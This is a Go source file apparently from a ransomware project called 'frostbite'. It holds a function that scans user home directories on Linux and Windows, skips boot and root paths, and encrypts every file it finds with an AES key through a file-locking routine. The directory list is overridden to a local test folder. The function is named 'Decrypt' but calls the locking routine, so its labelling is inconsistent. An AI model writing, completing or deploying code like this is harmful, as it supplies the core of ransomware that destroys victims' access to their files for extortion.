package system

import (
	"runtime"
	"time"

	file "frostbite.com/tools/file"
	humanize "github.com/dustin/go-humanize"
)

func WholeSystemDecrypt(aesKey []byte, encryptedAesKey []byte) {

	//set variables
	var (
		filesToEncrypt []string
		// sizeOfFoundFiles int64
	)
	dirsToScan := []string{
		"/home",
		"C:\\Users",
	}
	dirsToRemove := []string{"/", "C:", "C:\\\\", "/boot/efi", "/boot"}
	timeNow := time.Now()

	dirsToScan = generateListOfDirsToScan(dirsToScan, dirsToRemove)
	dirsToScan = []string{"/home/dejan/dev/go/malware/frostbite/data"}
	pl("dirsToScan: ", dirsToScan)

	runtime.GOMAXPROCS(runtime.NumCPU() / 2)
	//listen for channel and append to filesToEncrypt
	filesToEncrypt = getAllFiles(dirsToScan, filesToEncrypt)
	//encrypt files
	file.LockFilesArray(filesToEncrypt, aesKey, encryptedAesKey)

	timeEnd := time.Now()
	pl("\nTOTAL files found: ", humanize.Comma(int64(len(filesToEncrypt))))
	//print human readable size
	pl("Time elapsed: ", timeEnd.Sub(timeNow))

}
